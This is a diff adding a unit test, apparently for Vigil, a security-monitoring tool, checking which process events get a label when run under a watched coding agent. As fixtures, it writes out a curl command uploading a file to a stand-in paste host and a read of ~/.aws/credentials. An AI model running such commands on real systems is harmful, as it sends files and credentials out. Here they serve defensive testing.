@@ -116,4 +116,21 @@ describe('labelKey', () => {
       }),
     ).toMatchObject({ key: 'sys:xprotect_detected:/tmp/m' });
   });
+
+  it("skips what a watched agent runs (reviewed per session), but not Vigil's own helpers", () => {
+    const session = '0123456789abcdef';
+    const curl = apple('/usr/bin/curl', ['curl', '-F', 'f=@x', 'https://paste.example/u']);
+    expect(labelKey(exec(curl))).toBeDefined();
+    const underClaude: ProcessRef = { ...curl, agent: { id: 'claude-code', session, depth: 2 } };
+    expect(labelKey(exec(underClaude))).toBeUndefined();
+    const read = open(`${HOME}/.aws/credentials`, {
+      pid: 7,
+      path: '/opt/homebrew/bin/node',
+      signing: 'developer_id',
+      agent: { id: 'claude-code', session, depth: 1 },
+    });
+    expect(labelKey(read)).toBeUndefined();
+    const helper: ProcessRef = { ...curl, agent: { id: 'vigil-self', session, depth: 2 } };
+    expect(labelKey(exec(helper))).toEqual(labelKey(exec(curl)));
+  });
 });
